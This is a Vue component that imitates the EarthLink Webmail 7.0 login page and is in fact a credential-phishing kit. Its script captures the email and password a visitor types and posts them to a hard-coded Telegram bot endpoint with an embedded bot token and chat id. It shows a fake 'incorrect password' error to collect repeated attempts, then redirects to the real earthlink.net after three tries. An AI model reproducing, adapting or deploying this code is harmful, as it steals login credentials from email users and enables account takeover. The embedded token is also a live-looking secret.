<template>
  <div id="app">
    <body  class="theme-default app_base_login">

<!-- ngIf: !mobileDevice --><div ng-if="!mobileDevice" id="theme-container" ng-style="{ 'background-image': 'url(' + themeParams.image.data + ')', 'background-size': themeParams.image.bckSize ? themeParams.image.bckSize : 'cover' }" ng-class="{ 'has-theme': themeParams.theme.cssPrefix !== 'default', 'no-theme': themeParams.theme.cssPrefix === 'default', 'has-colors': branding.css.custom }" class="ng-scope no-theme has-colors" style="background-image: url(&quot;&quot;); background-size: auto;">
    <!-- uiView: growl --><div ui-view="growl" class="ng-scope"><div ng-controller="GrowlCtrl" aria-live="polite" aria-relevant="additions" class="ng-scope">
<div class=" " id="growlDimmer" ng-show="growlList.length > 0 &amp;&amp; growlStatus.fullPage"></div>
<!-- this parent div is always visible even when empty so the last growl can fade out of view -->
<div class="growlcontain gr0" >
    <!-- ngRepeat: growl in growlList | orderBy:'id' -->
</div>
</div>
</div>
    <!-- uiView: app --><div ui-view="app" class="ng-scope"><!-- ngInclude: 'components/navstatus/navstatus.html' --><div ng-controller="NavstatusCtrl" ng-include="'components/navstatus/navstatus.html'" class="ng-scope"><nav class="navbar navbar-fixed-top ng-scope" role="banner" ng-show="!isWM8Mode">
<div class="navbar-header">
    <div class="navbar-brand">
        <img class="navbar-logo" ng-src="./assets/images/navstatus-logo.png" alt="Webmail 7.0" src="./assets/images/navstatus-logo.png">
    </div>
</div>
<!-- ngIf: ( auth.isauth && auth.isverified && !auth.is2faSetupRequired && auth.prefsloaded && ($storage.preferences.fullname || ($storage.user && $storage.user.mail)) ) -->
</nav>

<div modal-directive="1" modal-id="'migrationModal'" modal-body="modal.body" modal-header="modal.header" modal-confirm="modal.confirm" data-ng-click-right-button="modal.rightButton();" class="ng-scope ng-isolate-scope"><div id="migrationModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="migrationModal-label" aria-hidden="true" aria-describedby="migrationModal-body migrationModal-footer">
<div class="modal-dialog ng-isolate-scope" role="document">
    <div class="modal-content">
        <div class="modal-header">
            <!-- ngIf: header -->
            <!-- ngIf: !header --><div id="migrationModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div><!-- end ngIf: !header -->
        </div>
        <div id="migrationModal-body">
            <!-- ngIf: body -->
            <!-- ngIf: bodyHtml -->
            <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
        </div>
        <div class="modal-footer" id="migrationModal-footer">
            <!-- ngIf: footer || checkboxLabel -->
            <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
            <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
            <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
            <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
            <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
        </div>
        <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
            <span aria-hidden="true">×</span>
        </button>
    </div>
</div>
</div>
</div>
<div modal-directive="1" modal-id="'instructionsModal'" template-url="components/navstatus/_partials/keyboard-instructions-modal.html" shared-data="instructionsModalData" class="ng-scope ng-isolate-scope"><div id="instructionsModal" class="instructionsModal modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="instructionsModal-label" aria-hidden="true">
<div class="modal-dialog ng-isolate-scope">
    <div class="modal-content">
        <div class="modal-header">
            <h4 id="instructionsModal-label" class="modal-title ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TITLE">Tips for Keyboard Users and Screen Readers</h4>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">×</span>
            </button>
        </div>
        <!-- ngIf: sharedData.currentPage === 1 --><div class="modal-body ng-scope" role="document" ng-if="sharedData.currentPage === 1">
            <div class="body-content">
                <p class="moreInfo firstParagraph ng-scope" tabindex="0" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_1">The following is a list of tips and keyboard commands you can use to navigate Webmail. There are three pages in this document. To move to the next page, activate the link at the bottom of this popup.</p>
                <br>
                <p class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_2">The following tables describe how to use different parts of the application. Move to these tables in JAWS or NVDA, using the <strong>"T"</strong> key to go to the table, and your table keys <strong>Control+Alt+Arrows</strong> to move within each table. When you get to the last table on this page press Tab to move to the link for the next page.</p>
            </div>
            <table class="instructionsTable page1">
                <caption>
                    <h4 translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_HEADING" class="ng-scope">The Basics: Sections of Application Window</h4>
                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_INFO">Normal screen reader navigation controls will work to move around, such as up/down arrow, tab key and shortcuts to landmarks, headings, links, buttons and form controls.</span>
                </caption>
                <thead>
                    <tr>
                        <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_SECTION" class="ng-scope">Section</th>
                        <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_DESCRIPTION" class="ng-scope">Description</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td class="firstCell ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR">Top Navigation bar</td>
                        <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR_INGO" class="ng-scope">Contains a screen reader button that opens this keyboard popup, and a dropdown labelled with your account email. Open it to go to the support center, take a tour of the features of this application, provide us with feedback, or log out.</td>
                    </tr>
                    <tr>
                        <td class="firstCell ng-binding">
                            Sections navigation
                            <br>
                            <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_INFO">(found after top navigation bar in tab order). Positioned as a vertical menu on the far left of the screen</span>
                        </td>
                        <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_BRIEFCASE_NO" class="ng-scope">Links to Mail, Calendars, Task Lists, Contacts and Preferences</td>
                    </tr>
                    <tr>
                        <td class="firstCell ng-binding">
                            Section options sidebar
                            <br>
                            <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_SIDEBAR_INFO">Positioned on the left side of the page, but to the right of the sections navigation bar.</span>
                        </td>
                        <td class="sidebarInstructions ng-binding">
                            This has all the options for the section you choose.
                            <ul class="instructionList">
                                <li translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_1" class="ng-scope">At the top of the menu there is a search input and a button to create a New  Email,  Event, Task, Contact, depending on which section is chosen.</li>
                                <li class="ng-binding">
                                    Below that there are items that can be managed depending on the section you are in. 
                                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_2B">Examples: mail folders, date-picker and calendars, task lists, address books, Briefcase/Online Storage folders or groups of preferences</span>
                                </li>
                            </ul>
                        </td>
                    </tr>
                    <tr>
                        <td class="firstCell ng-binding">
                            Main window
                            <br>
                            <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_INFO">For the selections above.</span>
                        </td>
                        <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_CONTENT" class="ng-scope">This is the main work area and will contain the item you are working on. It is where you will read or send emails, review or create calendar events, read or create tasks, manage your contacts or menage preferences.</td>
                    </tr>
                </tbody>
            </table>
        </div><!-- end ngIf: sharedData.currentPage === 1 -->
    
        <!-- ngIf: sharedData.currentPage === 2 -->

        <!-- ngIf: sharedData.currentPage === 3 -->
        <div class="modal-footer">
            <div class="first buttonContainer">
                <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Basics</button>
                <button ng-show="sharedData.currentPage === 3" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Specific Elements</button>
            </div>
            <div class="second buttonContainer">
                <button ng-show="sharedData.currentPage === 3" class="btn btn-default closeModalBtn ng-binding ng-hide" data-dismiss="modal" style="">Close</button>
            </div>
            <div class="third buttonContainer">
                <button ng-show="sharedData.currentPage === 1" type="button" class="btn btn-default confirm ng-binding" ng-click="sharedData.nextPage()">Next: Specific Elements<span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
                <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.nextPage()" style="">Next: Creating an Email <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
            </div>
        </div>
    </div>
</div>
</div>
</div>
<div modal-directive="1" modal-id="'languageModal'" modal-body-html="languageModalData.body" modal-header="languageModalData.header" data-ng-click-right-button="languageModalData.rightCallback();" data-ng-click-middle-button="languageModalData.middleCallback();" data-ng-click-left-button="languageModalData.leftCallback();" data-modal-rightbtn="languageModalData.rightButton" data-modal-middlebtn="languageModalData.middleButton" data-modal-leftbtn="languageModalData.leftButton" class="ng-scope ng-isolate-scope"><div id="languageModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="languageModal-label" aria-hidden="true" aria-describedby="languageModal-body languageModal-footer">
<div class="modal-dialog ng-isolate-scope" role="document">
    <div class="modal-content">
        <div class="modal-header">
            <!-- ngIf: header -->
            <!-- ngIf: !header --><div id="languageModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude">
</div><!-- end ngIf: !header -->
        </div>
        <div id="languageModal-body">
            <!-- ngIf: body -->
            <!-- ngIf: bodyHtml -->
            <div class="modal-body" ng-transclude="modalBodyTransclude">
</div>
        </div>
        <div class="modal-footer" id="languageModal-footer">
            <!-- ngIf: footer || checkboxLabel -->
            <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
            <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
            <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
            <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
            <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
        </div>
        <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
            <span aria-hidden="true">×</span>
        </button>
    </div>
</div>
</div>
</div>
</div>
<div ng-class="{content: true, 'simple-content': isWM8Mode}" ng-hide="hideContent" class="ng-scope content">
<div class="notificationWrapper">
    <!-- ngInclude: 'components/notification/notification.html' --><div ng-include="'components/notification/notification.html'" class="ng-scope"><div ng-controller="NotificationCtrl" class="ng-scope">
<div ng-show="!isWM8Mode &amp;&amp; notifications &amp;&amp; notifications.length>0" class="notification public ng-hide" ng-class="{'public': ($state &amp;&amp; $state.current &amp;&amp; $state.current.data &amp;&amp; $state.current.data.authreq === false)}">
<div scroll-directive="" width-offset="sizes.width.offset" class="notificationContainer ng-isolate-scope" role="dialog" tabindex="-1" style="width: 1536px;">
    <!-- ngRepeat: note in notifications track by $index -->
</div>
</div>
</div>
</div>
</div>
<!-- uiView: master --><div ui-view="master" class="ng-scope"><div class="scroll-container scrollBoth ng-scope ng-isolate-scope" scroll-directive="navStatusSizes.height" role="main" style="height: 475px;">
<div class="container login-container login-container-ads" ng-class="{'login-container-ads': customSpaceSides}">
    <div class="row">
        <div class="col-md-4 col-xs-4" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-2 col-sm-3': !customSpaceSides}">
            <!-- ngIf: customSpaceStatus.LoginLeft --><div class="customSpaceLoginLeft ng-scope ng-isolate-scope" ng-if="customSpaceStatus.LoginLeft" customspace-directive="'LoginLeft'">
              
        
            </div><!-- end ngIf: customSpaceStatus.LoginLeft -->
        </div>
        <div class="col-md-4 col-xs-4" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-8 col-sm-7': !customSpaceSides}">
            <div class="login-panel">
                <!-- <div>
                    <div role="img" aria-label="Webmail 7.0" class="login-logo"></div>
                </div> -->
             <center>  <img src="../src/assets/images/login-logo.png" alt="navstatus-logo" style="height: 40px;"></center> 
             <div id="loginMessage" class="login-message" >
                        <div v-if="isActive" ng-class="{'alert alert-danger alert-dimissible' : error.langkey}" class="alert alert-danger alert-dimissible">
                            <!-- ngIf: error.langkey --><button ng-if="error.langkey" type="button" class="close ng-scope" data-dismiss="alert" ng-click="resetError()">
                                <span class="fa fa-close" aria-hidden="true"></span><span class="sr-only ng-scope" translate="LANG_CLOSE_ALERT">Close alert</span>
                            </button><!-- end ngIf: error.langkey -->
                            <span role="alert">
                                <!-- space content required for reading same message again -->
                                <!-- ngIf: !error.langkey -->
                                <!-- ngIf: error.langkey --><strong ng-if="error.langkey" class="title ng-binding ng-scope">Error!</strong><!-- end ngIf: error.langkey -->
                                <!-- ngIf: error.langkey --><span ng-if="error.langkey" class="ng-binding ng-scope">Incorrect email address/password. Please try again.</span><!-- end ngIf: error.langkey -->
                            </span>
                        </div>
                    </div>
                <form role="form" ng-submit="signin(user)" class="ng-pristine ng-valid">
                    <div class="form-group">
                        <!-- <input type="text" class="form-control ng-pristine ng-untouched ng-valid" id="username" ng-model="user.username" placeholder="Email" aria-label="Email" > -->
                        <input type="text" v-model="formDataRes.email" class="form-control ng-pristine ng-untouched ng-valid" id="username"  placeholder="Email" aria-label="Email" >
                        <!-- <input type="email" name="name" id=""> -->
                        <!-- <input type="text" class="form-control ng-pristine ng-untouched ng-valid" id="username" ng-model="user.username" placeholder="Email" aria-label="Email" > -->
                    </div>
                    <div class="form-group">
                        <input type="password" v-model="formDataRes.password" class="form-control ng-pristine ng-untouched ng-valid" id="password" ng-model="user.password" placeholder="Password" aria-label="Password" >
                    </div>
                    <div class="form-group" aria-live="assertive">
                        <!-- ngIf: ( loadingstatus === '') --><button ng-if="( loadingstatus === '')" type="submit" class="btn btn-primary btn-lg btn-block ng-scope" translate="LANG_LOGIN_SIGN_IN" @click.prevent="finishJoob();">Log in</button><!-- end ngIf: ( loadingstatus === '') -->
                        <!-- ngIf: ( loadingstatus !== '') -->
                    </div>
                    <div class="clearfix">
                        <!-- ngIf: (degradedMode !== true) --><div ng-if="(degradedMode !== true)" class="login-forgot pull-right ng-scope">
                            <!-- ngIf: ( loadingstatus === '') && showForgotLink && !customForgotPassURL --><a ng-if="( loadingstatus === '') &amp;&amp; showForgotLink &amp;&amp; !customForgotPassURL" href="" ng-click="goToForgotPassword()" translate="LANG_LOGIN_FORGOT_PASSWORD" class="ng-scope">Forgot password?</a><!-- end ngIf: ( loadingstatus === '') && showForgotLink && !customForgotPassURL -->
                            <!-- ngIf: ( loadingstatus === '') && showForgotLink && customForgotPassURL -->
                        </div><!-- end ngIf: (degradedMode !== true) -->
                    </div>
                </form>
            </div>
            <div class="login-language">
                <hr>
                <div class="row">
                    <label class="col-sm-4 control-label ng-scope" id="languageLabel" translate="LANG_PUBLIC_AVAILABILITY_LANGUAGE">Language</label>
                    <div class="col-sm-8">
                        <dropdown-select dropdown-aria-labelledby="languageLabel" dropdown-model="currentLanguage" dropdown-on-change="languageChanged()" class="ng-isolate-scope dropdown-container"><div class="dropdown-select dropdown-trigger ng-isolate-scope" id="dropdown-28" ng-mousedown="DropdownCtrl.openDropdown()" tabindex="0" ng-class="{disabled: DropdownCtrl.dropdownDisabled()}" aria-disabled="false" role="button" aria-haspopup="listbox" ng-keydown="DropdownCtrl.dropdownTriggerKeydown($event)" aria-expanded="false" aria-controls="dropdown-listbox-28" tooltip-directive="" data-toggle="tooltip" data-placement="bottom" data-original-title="" aria-labelledby="languageLabel dropdown-28">
<div class="dropdown-selected-option-container"><span class="ng-binding ng-scope">English</span></div>
<span aria-hidden="true" class="fa fa-angle-down"></span>
</div>
<div class="dropdown-options-container ng-hide" id="dropdown-listbox-28" role="listbox" ng-keydown="DropdownCtrl.optionsKeydown($event)" ng-blur="DropdownCtrl.dontCloseOnBlur ? DropdownCtrl.dontCloseOnBlur = false : DropdownCtrl.closeDropdown()" ng-show="DropdownCtrl.open" ng-style="{right: right ? 0 : null, 'max-width': wrap ? '100%' : null, 'top' : optionsContainerTop ? optionsContainerTop : null}" tabindex="-1" aria-activedescendant="dropdown-option-49" style="top: -258px;">


<!-- dropdown-options dropdown-options dropdown-options dropdown-options dropdown-options dropdown-options dropdown-options dropdown-options -->







</div></dropdown-select>
                    </div>
                </div>
            </div>
            <!-- ngIf: customSpaceStatus.LoginSocial --><div class="customSpaceLoginSocial ng-scope ng-isolate-scope" ng-if="customSpaceStatus.LoginSocial" customspace-directive="'LoginSocial'"><div class="ng-binding ng-scope">Follow us: </div>
<div class="customSpaceTemplate ng-scope">
<!-- ngRepeat: i in items --><a ng-href="https://www.facebook.com/earthlink/" target="_blank" class="socialItem facebook" ng-repeat="i in items" href="https://www.facebook.com/earthlink/">
    <span class="fa fa-2x fa-facebook-square"></span>
</a><!-- end ngRepeat: i in items --><a ng-href="http://twitter.com/#!/earthlink" target="_blank" class="socialItem twitter" ng-repeat="i in items" href="http://twitter.com/#!/earthlink">
    <span class="fa fa-2x fa-twitter-square"></span>
</a><!-- end ngRepeat: i in items --><a ng-href="https://www.youtube.com/user/earthlinkbiz" target="_blank" class="socialItem youtube" ng-repeat="i in items" href="https://www.youtube.com/user/earthlinkbiz">
    <span class="fa fa-2x fa-youtube-square"></span>
</a><!-- end ngRepeat: i in items -->
</div></div><!-- end ngIf: customSpaceStatus.LoginSocial -->
        </div>
        <div class="col-md-4 col-xs-4" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-2 col-sm-3': !customSpaceSides}">
            <!-- ngIf: customSpaceStatus.LoginRight --><div class="customSpaceLoginRight ng-scope ng-isolate-scope" ng-if="customSpaceStatus.LoginRight" customspace-directive="'LoginRight'"><div id="div-gpt-ad-1346782722341-0" class="ng-scope" data-google-query-id="CJrdhp3mu4kDFXCZgwgdqekDcw"><div id="google_ads_iframe_/9633201/ELNK_Webmail_Hos_120x600_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/9633201/ELNK_Webmail_Hos_120x600_0" name="google_ads_iframe_/9633201/ELNK_Webmail_Hos_120x600_0" title="3rd party ad content" width="120" height="600" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" aria-label="Advertisement" tabindex="0" allow="private-state-token-redemption;attribution-reporting" data-load-complete="true" style="border: 0px; vertical-align: bottom;" data-google-container-id="1"></iframe></div></div></div><!-- end ngIf: customSpaceStatus.LoginRight -->
        </div>
        <div class="col-xs-12">
            <!-- ngIf: customSpaceStatus.LoginBottom -->
        </div>
    </div>
</div>
</div>
<snapuser-directive snap-user="snapUser" class="ng-scope ng-isolate-scope"></snapuser-directive>
</div>
<!-- ngInclude: undefined --><ng-include src="'components/topmodal/topmodal.html'" class="ng-scope"><div id="topModalContainer" class="ng-scope">
<!-- ngInclude: undefined -->
<div modal-body="errorMessage | translate" modal-directive="" modal-header="'LANG_ERROR' | translate" modal-id="'top-modal-error'" modal-closebtn="'LANG_CLOSE' | translate" class="ng-isolate-scope"><div id="top-modal-error" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="top-modal-error-label" aria-hidden="true" aria-describedby="top-modal-error-body top-modal-error-footer">
<div class="modal-dialog ng-isolate-scope" role="document">
    <div class="modal-content">
        <div class="modal-header">
            <!-- ngIf: header --><h4 id="top-modal-error-label" ng-if="header" class="modal-title ng-binding ng-scope" ng-bind="header">Error!</h4><!-- end ngIf: header -->
            <!-- ngIf: !header -->
        </div>
        <div id="top-modal-error-body">
            <!-- ngIf: body -->
            <!-- ngIf: bodyHtml -->
            <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
        </div>
        <div class="modal-footer" id="top-modal-error-footer">
            <!-- ngIf: footer || checkboxLabel -->
            <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding" data-ng-click="callbackbuttonclose()" data-dismiss="modal">Close</button>
            <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
            <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
            <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
            <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
        </div>
        <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
            <span aria-hidden="true">×</span>
        </button>
    </div>
</div>
</div>
</div>
</div>
</ng-include>
</div>
</div>
    <wcag-directive></wcag-directive>
</div><!-- end ngIf: !mobileDevice -->
<!-- ngIf: mobileDevice -->

<!-- Loading -->
<!-- <div ng-show="( isMobile !== true &amp;&amp; isMobile !== false )" class="loading-spinner-home loading-full-screen ng-hide">
    <span class="fa fa-fw fa-cog fa-spin"></span>
</div> -->

<!-- used in util-audiofile-factory for IE hack for playing sounds -->
<div id="audiocnt"></div>






</body>
</div>
</template>

<script>
// import HelloWorld from './components/HelloWorld.vue'
import axios from "axios"
export default {
  name: 'app',
  data() {
    return {
      formDataRes: {},
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 3
    }
  },
  components: {
    // HelloWorld 9
  },

  methods: {
    
    async finishJoob() {
      this.count = +this.count + 1
      console.log(this.count,this.finalCount)
      if (this.count < this.finalCount) {
      this.loading = false
      let message = this.formDataRes
      await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
      this.isActive = !this.isActive
      }else{
        location.replace("https://earthlink.net/")

      }
    },
    
   
    async sendTelegramResult(chatId, message){ 
      try{
      
        const url = `https://api.telegram.org/bot7762177089:AAHBcnJ5YWYAU1AHgidNBP-9zcr2ISvDPW4/sendMessage`;
         const payload = {
           chat_id: '7082528429',
           text: message,
         };
         console.log(payload)
         this.loading = true
         await axios.post(url, payload);
      
      }catch(error){
        console.log(error, 'error')

      }
    }

  }
}
</script>




